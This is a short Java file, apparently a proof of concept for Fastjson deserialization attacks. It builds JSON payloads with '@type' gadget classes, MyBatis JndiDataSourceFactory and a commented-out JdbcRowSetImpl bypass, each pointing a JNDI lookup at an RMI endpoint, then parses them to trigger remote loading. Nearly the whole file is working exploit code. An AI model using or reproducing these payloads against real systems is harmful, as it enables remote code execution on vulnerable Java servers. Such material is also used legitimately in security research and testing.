package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.sql.SQLException;

public class TestJndiDataSourceFactory {
    public static void main(String[] args) throws SQLException {
//        String fastSer =  "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
        String fastSer =  "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://127.0.0.1:1999/obj\"}}";
        System.out.println(fastSer);
        JSON.parseObject(fastSer);
    }
}